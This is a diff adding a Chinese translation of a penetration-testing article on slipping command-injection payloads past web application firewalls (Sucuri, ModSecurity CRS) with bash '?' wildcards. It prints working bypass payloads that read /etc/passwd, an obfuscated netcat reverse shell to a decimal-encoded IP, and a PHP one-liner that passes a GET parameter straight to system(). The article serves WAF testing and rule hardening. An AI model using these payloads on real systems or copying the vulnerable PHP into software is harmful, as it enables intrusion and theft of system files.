@@ -1,0 +1,68 @@
+远程命令执行漏洞是Web应用中常见的漏洞之一，在2017年发布的10项最严重的Web应用程序安全风险列表中”注入“毫不意外的被放在了第一位。
+当不可信数据作为命令或查询的一部分发送给解释器时，会发生注入漏洞，如SQL，NoSQL，OS和LDAP注入。攻击者的恶意数据可能会诱使解释器执行意外的命令或在没有适当授权的情况下访问数据。
+如今市面上的所有WAF几乎都已具备了对RCE攻击的拦截甚至阻断，但当它发生在Linux系统中时，我们已经有了极为巧妙的方法来绕过WAF规则集。作为渗透测试人员我们最大的朋友不是“狗”，而是“通配符”。在开始做WAPT之前，我想告诉你一些你可能不知道的关于bash和通配符的东西。
+关于通配符
+Bash标准通配符（也称为通配符模式）被各种命令行程序用于处理多个文件。有关标准通配符的更多信息，请通过键入man 7 glob命令查看手册了解。并不是每个人都知道有很多bash语法是可以使用问号“？”，正斜杠“/”，数字和字母来执行系统命令的。你甚至可以使用相同数量的字符获取文件内容。这里我为大家举几个例子：
+例如ls命令我们可以通过以下语法代替执行：
+/???/?s
+用这种语法，可以帮助你做许多你想要做的事情。例如你的攻击目标位于Web应用放火墙后，并且在其规则内配置了一条，用于阻止所有在GET或POST请求参数内包含/etc/passwd或/bin/ls的规则，那么此时你尝试诸如/?cmd=cat+/etc/passwd这样的请求，就会被目标WAF拦截，并且你的IP也将被永远禁止。但是如果你够幸运，目标WAF也没那么”偏执“对？和/这类的字符进行阻止，那么你就可以将你的请求编码成这样：/?cmd=%2f???%2f??t%20%2f???%2fp??s??
+正如你在以上截图中看到的，显示有3个错误“/bin/cat *: Is a directory”。发生这种情况是因为/???/?t不仅可以被转换为/bin/cat，还可以是/dev/net 或 /etc/apt等。
+问号通配符只能代表一个字符，可以是任何字符。因此，如果你知道一个文件名的一部分，但不是一个字母，那么你可以使用这个通配符。例如ls *.???将列出当前目录中，具有3个字符长度的所有文件。诸如.gif，.jpg，.txt之类扩展名的文件。
+使用该通配符，你可以使用netcat来执行一个反向shell。假设你需要在端口1337执行一个反向shell到127.0.0.1（通常是nc -e /bin/bash 127.0.0.1 1337），你可以用以下语法来完成：
+/???/n? -e /???/b??h 2130706433 1337
+以“长”格式（2130706433）转换IP地址127.0.0.1，可以避免在HTTP请求中使用“.”字符。
+在我的kali中，我将使用nc.traditional，而不是没有-e参数的nc，以便在连接后执行/bin/bash。构造的payload如下：
+/???/?c.??????????? -e /???/b??h 2130706433 1337
+现在对我们刚刚看到的这两个命令做个简单的总结：
+标准：/bin/nc 127.0.0.1 1337
+bypass：/???/n? 2130706433 1337
+使用的字符：/ ? n [0-9]
+标准：/bin/cat/etc/passwd
+bypass：/???/??t /???/??ss??
+使用的字符：/ ? t s
+为什么使用？代替*？这是由于星号（*）常被广泛用于评论语法（例如/*嘿，我是一条评论*/），许多WAF都会对该语法进行阻止，以避免像UNION+SELECT+ 1,2,3 /*这类的SQL注入语句...
+枚举文件和目录我们可以使用echo命令吗？答案是肯定的。在文件系统中echo命令支持使用通配符枚举文件目录。例如：echo /*/*ss*。
+我们可以在具有RCE漏洞的URL上使用该命令语法，以获取目标系统上的文件和目录信息，例如：
+但为什么使用通配符（特别是问号）可以帮助我们躲避WAF规则集呢？ 让我从Sucuri WAF讲起！
+Sucuri WAF绕过
+测试WAF规则集的最好办法是什么？ 毫无疑问是创建一个脆弱的PHP脚本，并尝试所有可能的技术点！在上方截图中可以看到，在左上方的窗口中我写了一个极为简易的Web应用程序（一个执行命令的PHP脚本）：
+<?php echo 'ok: '; print_r($_GET['c']); system($_GET['c']);
+而在左下方的窗口中可以看到，Sucuri WAF（test1.unicredit.it）对我发起的命令执行请求进行了拦截，并提示”检测到RFI/LFI尝试拦截“。
+现在我们来看看具有相同请求的右窗口，唯一不同的是这里我使用了”？“通配符代替了原来的字符。从结果上可以看到Sucuri WAF并未对我们的请求进行拦截，我的脚本执行了GET给c参数的系统命令。此时我可以轻松的读取/etc/passwd文件内容，甚至可以读取到应用的PHP源码，使用netcat执行反向shell（/???/?c），还可以执行像curl或wget这样的命令，来获取服务器的真实IP地址，使我能够通过直接连接目标来绕过WAF。
+OWASP ModSecurity 核心规则集
+我是ModSecurity的忠实粉丝，我认为用于Nginx和Nginx连接器的新的libmodsecurity（v3）是我用来部署Web应用程序防火墙的最佳选择。我也是OWASP核心规则集的忠实粉丝！我经常使用到它，如果你不了解这个规则集的话，可能你已经忘记了什么叫做爱情！
+PL1~PL4
+以下注释很好的概述了每个级别在“REQUEST PROTOCOL ENFORCEMENT”规则上的工作原理。可以看到PL1，一个查询字符串只能包含1-255范围内的ASCII字符，直到PL4在非常小的范围内阻止所有不是ASCII的字符。
+# -=[ Targets and ASCII Ranges ]=- # # 920270: PL1 # REQUEST_URI, REQUEST_HEADERS, ARGS and ARGS_NAMES # ASCII: 1-255 # Example: Full ASCII range without null character # # 920271: PL2 # REQUEST_URI, REQUEST_HEADERS, ARGS and ARGS_NAMES # ASCII: 9,10,13,32-126,128-255 # Example: Full visible ASCII range, tab, newline # # 920272: PL3 # REQUEST_URI, REQUEST_HEADERS, ARGS, ARGS_NAMES, REQUEST_BODY # ASCII: 32-36,38-126 # Example: Visible lower ASCII range without percent symbol # # 920273: PL4 # ARGS, ARGS_NAMES and REQUEST_BODY # ASCII: 38,44-46,48-58,61,65-90,95,97-122 # Example: A-Z a-z 0-9 = - _ . , : & # # 920274: PL4 # REQUEST_HEADERS without User-Agent, Referer, Cookie # ASCII: 32,34,38,42-59,61,65-90,95,97-122 # Example: A-Z a-z 0-9 = - _ . , : & " * + / SPACE
+让我们对所有这些等级做个测试！
+Level 0 (PL0)
+PL0级意味着许多规则被禁用了，所以我们的payload可以正常被执行。
+SecAction "id:999,\ phase:1,\ nolog,\ pass,\ t:none,\ setvar:tx.paranoia_level=0"
+ModSecurity中的等级0意味着“高质量的完美规则，几乎没有误报”，但也并不是不可绕过。你可以在netnea网站上找到按级别分组的规则列表：https://www.netnea.com/cms/core-rule-set-inventory/
+Level 1 和 2 (PL1, PL2)
+我已经将级别1和2分组，因为它们之间的差异（如上所示）并不会对目标产生影响，所有行为都与以下相同。
+SecAction "id:999,\ phase:1,\ nolog,\ pass,\ t:none,\ setvar:tx.paranoia_level=1"
+PL1（和PL2）ModSecurity阻止了我的请求提示“OS文件访问尝试”（930120）。但是如果我使用？作为通配符呢？ 结果成功绕过了WAF：
+发生这种情况是因为“？”，“/”和“空格”在规则920271和920272的可接受的字符范围内。而且使用“？”而不是命令语法，可以避开拦截操作系统常用命令和文件（例如/etc/passwd）的“OS文件”过滤器。
+Level 3 (PL3)
+这个等级相对于前两个则优化了不少，它会阻止包含“？”等字符超过n次的请求。我的请求被标志为“元字符异常检测警报 - 重复非单词字符”。但我依然可以通过对payload简单修改来绕过它：c=/?in/cat+/et?/passw?
+正如你所看到的，只用3个“？”，就可以绕过该级别的过滤，读取目标系统中的passwd文件。但需要提醒大家的是，这并不意味着你就要将你的当前等级强制设为4，因为这里只是一个测试环境并不是真实的生产环境。
+Level 4 (PL4)
+对于该级别我没法绕过，至少对我而言是如此。范围a-z A-Z 0-9之外的所有字符都会被过滤！要知道通过命令执行读取文件，有90％的概率都需要一个“空格”字符或“斜线”。
+更多奇淫技巧，还可以阅读我关于WAF绕过的第二篇文章：https://medium.com/@themiddleblue/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0
+结语
+回到原始的HTML静态页面...这应该是提高Web应用程序安全性的最快方法！很难说什么是躲避WAF的最佳配置，或什么等级是最好的。但我可以说，恕我直言我们不应该轻易信任Web应用上的规则集，而是应该根据每个应用的功能配置合适的WAF规则。
+无论如何，当你在你的ModSecurity或类似的东西上编写一个新的SecRule时，请记住，可能会有很多种方法能绕过你的过滤规则，你需要不停的思考各种绕过的可能性，并不断的去完善它。
+我的书签
+了解更多关于ModSecurity的规则：
+https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual
+netnea关于Apache ModSecurity的文章：
+https://www.netnea.com/cms/apache-tutorials/
+SpiderLabs Blog：
+https://www.trustwave.com/Resources/SpiderLabs-Blog/
+ModSecurity v3 Github：
+https://github.com/SpiderLabs/ModSecurity/tree/v3/master
+联系我
+https://twitter.com/Menin_TheMiddle
+https://github.com/theMiddleBlue
+*参考来源：medium，FB小编 secist 编译，转载请注明来自FreeBuf.COM
